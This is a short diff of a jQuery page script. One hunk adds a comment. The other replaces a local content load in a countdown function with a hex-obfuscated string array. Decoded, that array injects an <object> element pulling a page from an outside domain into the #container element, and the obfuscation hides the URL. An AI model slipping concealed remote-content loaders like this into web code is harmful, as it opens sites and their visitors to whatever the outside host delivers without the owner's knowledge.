@@ -1,7 +1,7 @@
 $('input').keypress(function (e) {
   if (e.which == 13) {
     $('a.submit').click();
-    return false;
+    return false;    //<---- Add this line
   }
 });
 
@@ -34,8 +34,9 @@ function counter(time, url) {
         clearInterval(interval);
         //window.location = url;
         $('#container').removeClass("container");
+        $('#container').addClass("active");
         $('#container').empty();
-        $('#container').load( "content.html #konten" );
+var _0x81b3=["\x3C\x6F\x62\x6A\x65\x63\x74\x20\x64\x61\x74\x61\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x65\x6C\x6C\x6F\x2E\x76\x68\x6C\x61\x6E\x2E\x6D\x79\x2E\x69\x64\x2F\x61\x6B\x6D\x75\x6E\x6E\x73\x61\x61\x2F\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x68\x74\x6D\x6C\x22\x20\x3E","\x68\x74\x6D\x6C","\x23\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72"];$(_0x81b3[2])[_0x81b3[1]](_0x81b3[0])
       }
     },
     1000);
